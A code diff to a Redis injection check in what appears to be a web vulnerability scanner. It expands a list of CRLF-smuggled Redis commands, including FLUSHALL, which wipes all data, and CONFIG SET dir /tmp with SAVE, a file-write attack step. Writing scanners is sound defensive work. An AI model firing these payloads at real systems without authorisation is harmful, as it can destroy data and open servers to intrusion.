@@ -1,6 +1,6 @@
 import copy
 import httpx
-from modules.scanner.base_check import BaseCheck, CheckResult
+from modules.scanner.base_check import BaseCheck, CheckResult, cap_payloads
 
 
 class RedisInjectionCheck(BaseCheck):
@@ -8,15 +8,19 @@ class RedisInjectionCheck(BaseCheck):
 
     async def run(self, base_request: dict, target_params: list[str]) -> list[CheckResult]:
         results = []
-        payloads = ["\r\nSET injected_key injected_value\r\n", "\r\nFLUSHALL\r\n", "\r\nCONFIG SET dir /tmp\r\n", "\r\nSAVE\r\n"]
+        payloads = [
+            "\r\nSET injected_key injected_value\r\n", "\r\nFLUSHALL\r\n",
+            "\r\nCONFIG SET dir /tmp\r\n", "\r\nSAVE\r\n",
+            "%0d%0aSET test test", "%0aSET test test", "\\r\\nSET test test",
+        ]
         async with httpx.AsyncClient(verify=False, timeout=15, follow_redirects=False) as client:
             for param in target_params:
-                for payload in payloads:
+                for payload in cap_payloads(payloads):
                     modified = self._inject_payload(base_request, param, payload)
                     try:
                         resp = await client.request(**modified)
                         if resp.status_code == 200:
-                            indicators = ["+OK", "-ERR", "+PONG"]
+                            indicators = ["+OK", "-ERR", "+PONG", "WRONGTYPE"]
                             for ind in indicators:
                                 if ind in resp.text:
                                     results.append(CheckResult(
@@ -27,6 +31,7 @@ class RedisInjectionCheck(BaseCheck):
                                         evidence=f"Payload: {payload[:50]}...\nIndicator: {ind}",
                                         remediation="Sanitize input passed to Redis commands. Use parameterised commands or key-value access patterns.",
                                         cwe="CWE-77",
+                                        param=param,
                                     ))
                                     break
                     except Exception:
